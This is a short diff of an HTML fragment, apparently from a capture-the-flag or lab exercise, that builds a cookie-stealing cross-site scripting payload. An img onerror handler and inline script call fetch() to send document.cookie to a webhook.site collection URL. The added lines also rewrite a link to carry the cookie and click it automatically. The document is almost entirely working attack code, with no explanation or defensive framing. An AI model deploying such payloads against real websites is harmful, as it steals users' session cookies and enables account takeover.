@@ -5,9 +5,11 @@
                     <iframe  name="frame"></iframe>
 
                     <a href="https://webhook.site/81a20f93-8670-419e-a8b4-e61bba21b005?q=" target="frame" id="link">Go to admin login</a>
-                    <img src=x onerror="fetch('https://webhook.site/81a20f93-8670-419e-a8b4-e61bba21b005?q='+document.cookie,{mode: 'no-cors', headers:{'Access-Control-Allow-Origin':'*'}},)" alt="">
+                    <img src=x onerror="fetch('https://webhook.site/81a20f93-8670-419e-a8b4-e61bba21b005?q='+document.cookie)" alt="">
          
 <script>
+    document.getElementById('link').href="https://webhook.site/81a20f93-8670-419e-a8b4-e61bba21b005?q="+document.cookie;
+    document.getElementById('link').click();
 fetch('https://webhook.site/81a20f93-8670-419e-a8b4-e61bba21b005?q='+document.cookie,
 {
     method:'GET',
